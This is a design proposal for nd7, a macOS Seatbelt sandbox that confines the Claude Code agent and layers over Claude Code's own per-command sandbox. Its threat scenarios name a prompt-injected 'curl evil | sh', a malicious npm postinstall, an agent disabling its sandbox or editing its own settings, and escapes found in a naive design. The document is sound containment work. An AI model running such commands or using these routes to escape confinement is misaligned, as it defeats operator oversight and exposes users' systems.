nd7 · Tier 1 sandboxing · design proposal · revised 21 Sep 2026

Confine Claude Code with Seatbelt, and stay on top of Claude Code's own sandbox

One kernel boundary over the whole agent that no command can ever run outside of, Claude Code's per-command sandbox kept fully functional inside it, and two small trusted "trampolines" that give nd7 a dynamic per-call policy. Every claim below was run on this machine.

Decision taken, 21 Sep 2026

The veto design. nd7's floor denies sandbox-exec and every other way to apply a profile. Claude Code's own sandbox cannot start under nd7, Claude Code drops it for the session as it does today, and every command runs under nd7's policy and nothing else. This depends on kernel semantics only, not on how Claude Code spawns processes. Per-call policy and live nd7 allow come from the shell catch, PATH plus SHELL, a POSIX convention every agent honours; if a catch is ever missed the command still runs under the floor and widening falls back to restart with --resume.

Two earlier revisions of this page are kept below as evidence, not as the proposal: letting Claude Code's sandbox-exec leave the floor, rejected because a command then ran under Claude Code's policy alone, and the env interposer that intersects Claude Code's profile with the floor, proven to work but shelved because it stands on Claude Code's spawn conventions. What is given up: Claude Code's /sandbox settings have no effect under nd7, and hostname-level network filtering becomes an nd7 feature when needed. Tier 2, full VM isolation, stays on the roadmap.

The problem in one rule

Seatbelt, the macOS kernel sandbox, applies one profile to a process and every process it ever spawns. The kernel refuses any attempt by a confined process to apply a different profile: looser, tighter, a superset, a subset, or the same rules with a different parameter. All fail with EPERM. Only a semantically identical profile is accepted, as a no-op.

That single rule caused both blockers. A session's boundary could never change while it ran, and Claude Code's own per-command sandbox, which wraps each Bash call in sandbox-exec, could not start underneath ours. Depending on our rules it either exited every Bash call with code 71, or failed to initialise and silently disabled itself for the rest of the session.

What a trampoline is

Trampoline, in computing, is a small piece of trusted code you jump onto in order to be bounced somewhere else: a different privilege level, a different execution context, a different address space. The name is the picture. You cannot walk from where you are to where you need to be, so you step onto the one thing that is allowed to launch you.

Classic examples: the tiny stub the kernel places on a process's stack so a signal handler can return to the kernel; the "thunk" a compiler emits to hop between calling conventions; the launcher a setuid program uses to drop privileges before running user code.

Here the trampoline is the nd7 binary itself. The outer profile names it as the one program whose exec is allowed to leave the sandbox. Everything that goes through it is bounced out of the outer boundary and immediately landed inside a fresh boundary that nd7 chooses at that moment. The sandboxed process never gains anything; it can only ask nd7 to run a command, and nd7 decides under which rules.

The Seatbelt rule that makes this possible is an exec modifier Apple uses in its own system profiles:

(allow process-exec (with no-sandbox) (literal "/Users/you/.cargo/bin/nd7"))

It compiles and it works through our own sandbox_init path. Exec of that exact path produces an unsandboxed process. Every other exec in the tree stays confined. The child can then apply any profile, which is exactly what a confined process cannot do.

Why the door is safe to leave open

The sandboxed side controls only two things: the command string and its own environment. Neither reaches the policy. The spike found two holes in a naive trampoline and the fix for both is the same rule:

  • Parameters never come from the caller. A trampoline that took the project path from the caller's cwd escaped with cd /. One that took HOME from the environment escaped with HOME=/private/tmp. Instead, nd7 run writes a session record, root pid plus policy plus resolved paths, and the trampoline finds its record by walking its own parent-pid ancestry, which a caller cannot forge.
  • The binary and the policy directory are unwritable from inside. The outer profile denies writes there. Claude Code's own code applies the same test to a shell prefix: an absolute path outside what the session can write.
  • Nothing else gets the rule. Never a shell, an interpreter, or sandbox-exec as a general exit.
  • Direct calls are still policed. A Bash command that invokes nd7 by hand, bypassing the prefix, gets the same session policy. Tested.

Why nothing can rewrite an exec, and what that leaves

A Seatbelt rule sees an exec and can only allow or deny it. Endpoint Security sees every exec with its arguments and can also only allow or deny, and needs an Apple entitlement. Kernel extensions are gone. The claude binary's hardened runtime blocks injection. So on macOS there is no "catch this exec and change its profile". Every interception works by the child resolving a bare name through PATH or SHELL and finding our binary there. What is convention-free is the veto: the floor governs every exec, and the one-profile rule means claude cannot apply any sandbox unless we allow it. That is the design adopted above: deny them all, allow only ours.

The rest of this section documents the interposer variant that was spiked and shelved. It shows how far the catch-point approach can go, and it is the fallback if hostname filtering through Claude Code's proxy is ever wanted without an nd7 proxy.

Shelved: intersecting Claude Code's profile with the floor

Claude Code builds every sandboxed Bash command as one process invocation:

env HTTPS_PROXY=… TMPDIR=… /usr/bin/sandbox-exec -p "<its 49 KB SBPL profile>" /bin/zsh -c "<command>"

and it resolves env through PATH. That is the opening. nd7 installs a second trampoline named env on a directory it puts first on Claude Code's PATH, and names that binary as an exit in the floor. So Claude Code hands nd7, still outside any sandbox, its entire requested profile, its proxy environment, the shell and the command. The interposer appends the nd7 floor to Claude Code's profile as deny rules, applies the combined profile to itself, and execs the shell. The real sandbox-exec is never run, so there is no nesting to fail. The kernel enforces both policies on the command: what Claude Code allows and what the floor allows. Claude Code sees its sandbox working exactly as designed, with its proxy, its domain filter, its prompts and its /sandbox command all intact.

The spike proved the property that matters. With Claude Code's sandbox enabled, a write into a project subdirectory that Claude Code's policy allows was denied by the floor's appended rule, while a normal project write succeeded and an HTTPS request went through Claude Code's proxy and domain filter to a 200. From inside such a command, sandbox-exec with an allow-all profile was refused: the interposer is not an exit inside the combined profile, so nesting stays closed.

Three Seatbelt details the intersection depends on

  • Per-operation rules beat class rules, whatever the order. Claude Code allows the project with file-write-create and friends. A later (deny file-write* …) loses to them. The appended floor must list every concrete operation, file-write-create, -data, -unlink, -mode and the rest; then last match wins. The first live run allowed the denied subdirectory for exactly this reason.
  • Inside require-not, a wildcard port never matches. localhost:* in the exception list denied everything on loopback and broke Claude Code's proxy. An exact localhost:PORT works, and the interposer has the port, since Claude Code passes HTTPS_PROXY=…@localhost:PORT in the same argv.
  • Claude Code's proxy forwards over a unix socket. It lives in the claude process, under the floor, and relays each tunnel through $TMPDIR/srt-mux-…sock. The floor needs outbound access to that socket path, or every proxied request is a 502 while nothing is logged.

One detail makes the layers compose. Claude Code applies the shell prefix inside its own sandbox, so the prefix trampoline is usually exec'd from an already-confined shell where it is not an exit at all. It must notice that and simply run the shell. sandbox_check gives it that signal: it returns 1 under any profile and 0 only after one of our exits. Inside a combined profile nd7 sees 1 and execs the shell; on the escape-hatch path, where Claude Code runs the command without its sandbox, it sees 0 and applies policy Q. The same test lets the env interposer behave as plain env whenever a command inside the sandbox calls it.

Scenarios: which sandbox handles what

Each card names a situation, then which layer answers it. floor is nd7's outer profile, Claude Code its per-command sandbox, nd7 policy the per-call layer behind the trampoline.

Prompt injection asks for curl evil | sh

The Bash command runs under one profile that is Claude Code's allowlist intersected with the floor. Whatever the script does is confined by both at once; the network goes through Claude Code's domain-filtering proxy, whose own egress is bounded by the floor.

Handled by Claude Code ∧ floor, one profile

Malicious npm postinstall during npm install

Same path as any Bash command. It cannot read ~/.ssh or the rest of the keychain, cannot write outside the project, and cannot apply its own sandbox to break out.

Handled by Claude Code then floor

The model retries with dangerouslyDisableSandbox

Claude Code runs the command outside its own sandbox. The prefix still applies, so it reaches nd7 exec, which lands it in the session policy rather than on the bare floor. Tested: the $HOME write was still denied.

Handled by nd7 policy then floor

Claude's Write or Edit tool targets a path outside the project

These run inside the claude process, not in a shell. Only the floor applies. The write is refused with EPERM and the model reports it. Widening for these needs a restart under a wider floor with --resume, about 3 seconds.

Handled by floor only

User wants to grant a directory mid-session

nd7 allow ~/data in another terminal. The next Bash call runs under the widened policy. For Claude Code's own layer the user uses /sandbox as today. No restart, no UI beyond the command line.

Handled by nd7 policy and Claude Code

Claude Code's sandbox fails to start or is turned off

Previously the worst outcome: it disabled itself silently. Now the floor still holds and the prefix still routes every Bash command through nd7's policy, so per-call confinement continues with ours instead of theirs.

Handled by nd7 policy then floor

A future Claude Code release enforces its sandbox

It works under the floor through the interposer, with the floor still applied to every command. If Claude Code also stopped resolving env through PATH, its sandbox-exec would hit the floor with no exit and fail closed: Claude Code disables its sandbox for the session and commands run under the floor directly. The boundary never depends on the hook.

Handled by Claude Code ∧ floor; fallback floor only

The model edits .claude/settings.json to widen its own sandbox

Claude Code's sandbox refuses Bash writes to its own settings file. Even if it did not, the floor is not read from that file. Tested from inside a sandboxed Bash: PermissionError.

Handled by Claude Code then floor

A compromised MCP server or hook script

These live in the outer tree with the claude process and are confined by the floor. The only exits are the two nd7 binaries, and both apply a policy to whatever they run, so calling them gains nothing. This is strictly better than Claude Code alone, which does not sandbox these at all.

Handled by floor

Another agent entirely (not Claude Code)

The floor and the trampoline are agent-agnostic. What is missing is the middle layer and the prefix hook; nd7's policy then covers Bash through a PATH shim instead. Same policy engine, same log.

Handled by floor and nd7 policy

Why nd7, then

If Claude Code already sandboxes commands, what does nd7 add? Four things, and none of them is "a second sandbox".

A floor the agent cannot move

Claude Code's sandbox is configured by settings the session can read and, in places, write, and it degrades to "off" when it cannot start. The floor is set by the operator, enforced by the kernel, and applies to the claude process itself, its file tools, MCP servers and hooks, which Claude Code's sandbox never covered.

Policy derived from evidence

nd7 already records every tool call. The floor and the per-call policy are rendered from what recorded sessions actually touched, and nd7 denials shows exactly which rule each denial would need. Hand-written allowlists are looser and less explainable.

Dynamic without a daemon

The trampoline gives kernel-enforced per-call policy that can change between two commands, with no long-lived service, no socket protocol and no UI beyond a shell command. The only process outside the boundary is the one that started the session.

Agent-agnostic, tiered

Nothing in the floor or the trampoline is specific to Claude Code; the prefix is merely the most convenient hook. The same policy engine renders a Seatbelt profile today, and a VM configuration in Tier 2, from the same recorded sessions.

Risks and open items

  • no-sandbox is undocumented. Apple uses it in its own profiles, which is good evidence it will not vanish casually, but it is not API. If it ever goes, the floor-alone design remains and Tier 2 covers the rest.
  • Both hooks are Claude Code behaviour, not API. The shell prefix is documented; resolving env through PATH and passing -p <profile> is an implementation detail observed in 2.1.278. If either changes, the failure is closed: Claude Code's sandbox-exec hits the floor with no exit, its sandbox disables itself for the session, and commands run under the floor directly. nd7 should detect the exit-71 and "sandboxing disabled" signatures and report which layers are active.
  • The intersection is built from Claude Code's profile text. New operations or filter forms in a future profile could need new deny rules in the floor. The per-operation list comes from Apple's own profiles and should be regenerated per OS release.
  • The exits are binaries, so they are trust anchors. Both must be unwritable from inside, must never take a policy path from argv, cwd or environment, and must be separate from the nd7 binary that implements allow.
  • Signals. The floor needs (allow signal) for Claude Code to kill timed-out commands; restricting to children leaves orphans. The trampoline applying the profile to itself and exec'ing in-process removes the grandchild that would be orphaned.
  • Process listing. ps and pgrep are denied under deny-default. Whether Claude Code needs them is untested.
  • Excluded commands. Claude Code's excludedCommands setting did not take effect in the non-interactive run, so that path is unverified. It should behave like the escape hatch, which was verified.
  • Terminals. Any interactive use needs (allow file-ioctl). Seatbelt's (trace) is dead on this OS; denials come from the unified log.
  • Write and Edit stay static. Dynamic grants reach shells, not the claude process. Restart with --resume covers it in about 3 seconds. A hook-based redirect is possible but awkward.

Glossary

SeatbeltThe macOS kernel sandbox. A process applies a profile with sandbox_init; the kernel enforces it on that process and all descendants.
SBPLSandbox Profile Language, the Scheme-like text a profile is written in: (allow file-write* (subpath …)).
ProfileOne compiled SBPL policy. A process tree has exactly one, fixed at the moment it is applied.
TrampolineA small trusted program you exec in order to be bounced into a different execution context. Here: the nd7 binary, the one exec the floor allows to leave the sandbox.
no-sandboxThe SBPL exec modifier that makes the exec'd program run unsandboxed: (allow process-exec (with no-sandbox) (literal …)).
Floornd7's outer profile over the whole tree, and the deny rules appended to every per-command profile. The boundary that applies to every command and holds when everything above it fails.
InterposerA program that stands in for another so it can see and alter a call before passing it on. Here: nd7's env, which receives Claude Code's sandbox-exec invocation and runs the command under the intersected profile instead.
IntersectionA profile that allows only what two policies both allow. Built by appending one policy's rules as per-operation denies after the other's allows.
Shell prefixCLAUDE_CODE_SHELL_PREFIX, a program Claude Code puts in front of every Bash tool command, receiving the whole command as one argument.
Escape hatchClaude Code's dangerouslyDisableSandbox parameter: the model may ask to run one command outside Claude Code's sandbox, subject to a permission prompt.
Session recordWhat nd7 run writes for the trampoline: root pid, resolved project and home paths, current policy. Lives where the floor denies writes.
Extension tokenApp Sandbox's kernel-issued grant for one path, consumed at runtime by a confined process. Verified working; held in reserve.
